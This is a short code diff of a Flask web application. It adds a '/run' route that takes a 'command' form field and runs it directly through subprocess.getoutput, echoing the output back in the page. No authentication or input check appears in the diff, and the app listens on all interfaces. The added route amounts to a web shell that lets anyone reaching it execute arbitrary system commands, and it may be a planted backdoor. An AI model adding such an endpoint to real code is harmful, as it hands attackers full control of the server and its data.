@@ -270,7 +270,15 @@ def block_ip(e):
            ua = request.headers.get("User-Agent")
            logging.warning(f"IP : {ip} | PATH : {path} | UA : {ua} | LIMIT EXCEEDED")
            return render_template("limiter.html"),429  
-           
+
+@app.route("/run", methods=["POST"])
+def run_command():
+    cmd_key = request.form["command"]
+    command = cmd_key
+    result = subprocess.getoutput(command)
+    return f"<pre>{result}</pre><br><a href='/panel'>Back</a>"
+
+
 if __name__ == "__main__":
     app.run(
     host = "0.0.0.0",
